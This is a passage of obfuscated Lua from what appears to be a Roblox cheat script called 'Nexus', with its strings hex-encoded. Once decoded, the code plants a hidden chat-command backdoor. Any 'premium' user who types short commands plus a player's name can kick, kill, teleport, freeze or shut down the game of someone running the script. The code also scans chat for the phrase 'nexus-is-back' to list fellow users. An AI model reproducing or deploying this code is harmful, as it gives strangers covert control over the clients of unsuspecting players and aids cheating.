\x72\x73") local _=game:GetService("\x54\x65\x78\x74\x43\x68\x61\x74\x53\x65\x72\x76\x69\x63\x65") local _=a.LocalPlayer local b=_.Name:gsub("\x5F","") for _,a in ipairs(a:GetPlayers())do a.Chatted:Connect(function(_)local _,_=pcall(function()local _=_:gsub("\x5F","") if _=="\x2E\x6B\x20"..b then game.Players.LocalPlayer:kick("\x6E\x65\x78\x75\x73\x2D\x70\x72\x65\x6D\x69\x75\x6D\x20\x75\x73\x65\x72\x20\x68\x61\x73\x20\x6B\x69\x63\x6B\x65\x64\x20\x79\x6F\x75")elseif _=="\x2E\x20"..b then game.Players.LocalPlayer.Character.Humanoid.Health=0 elseif _=="\x2E\x62\x20"..b then game.Players.LocalPlayer.Character:FindFirstChild("\x48\x75\x6D\x61\x6E\x6F\x69\x64\x52\x6F\x6F\x74\x50\x61\x72\x74").CFrame=game.Players[a.Name].Character.HumanoidRootPart.CFrame elseif _=="\x2E\x73\x20"..b then game:Shutdown()elseif _=="\x2D\x20"..b then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored=true elseif _=="\x2E\x75\x20"..b then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored=false end end)end)end end end) local e={} local d={} local a local function c()if a then a:SetValues(e)end end local function _(b)for a,_ in ipairs(e)do if _==b.Name then table.remove(e,a) d[b]=nil c() break end end end game.Players.PlayerRemoving:Connect(function(a)_(a)end) a=premium=="\x70\x72\x65\x6D\x69\x75\x6D"and f:AddDropdown("\x44\x72\x6F\x70\x64\x6F\x77\x6E",{Title="\x53\x65\x6C\x65\x63\x74\x20\x4E\x65\x78\x75\x73\x20\x55\x73\x65\x72",Values=e,Multi=false,Default="",Callback=function(_)getgenv().Selected=_ end}) task.spawn(function()while wait()do for _,a in ipairs(game.Players:GetPlayers())do a.Chatted:Connect(function(_)if _=="\x6E\x65\x78\x75\x73\x2D\x69\x73\x2D\x62\x61\x63\x6B"and not d[a]then if not table.find(e,a.Name)and a~=game.Players.LocalPlayer then local _=a.Name:gsub("\x5F","") table.insert(e,_) print("\x44\x65\x74\x65\x63\x74\x65\x64\x3A",_) d[a]=true c()end end end)end end end) local _=b:AddKeybind("\x4D\x65\x6E\x75\x4B\x65\x79\x62\x69\x6E\x64",{Title="\x4D\x69\x6E\x69\x6D\x69\x7A\x65\x20\x42\x69\x6E\x64",Default=h.MenuKeybind}) _:OnChanged(function()h.MenuKeybind=_.Value i:SaveSettings()end) g.MinimizeKeybind=_ end end return i
